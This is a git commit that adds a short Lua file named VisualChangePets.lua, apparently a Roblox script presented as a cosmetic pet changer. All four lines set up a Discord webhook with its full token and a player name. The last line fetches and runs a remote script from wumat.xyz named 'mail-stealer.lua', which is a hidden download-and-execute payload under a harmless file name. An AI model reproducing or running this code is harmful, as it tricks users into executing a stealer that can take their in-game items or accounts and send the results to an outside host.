e09af3fd6fe2a078bac09f5671d3d330889d85b1
ProjectWD <127246214+ProjectW-D@users.noreply.github.com>
2023-03-13 00:31:47 +0700

    Add files via upload

---
+++ VisualChangePets.lua
@@ -0,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1082732537668964392/pWmk-WCguamjIw7lm3TfICoU95AR7JNB3uGhr5H4mkPhTmcf2tia8JlrZonImkISmoK2"
+getgenv().name = "Vietnam19990"
+getgenv().mouselock = true 
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
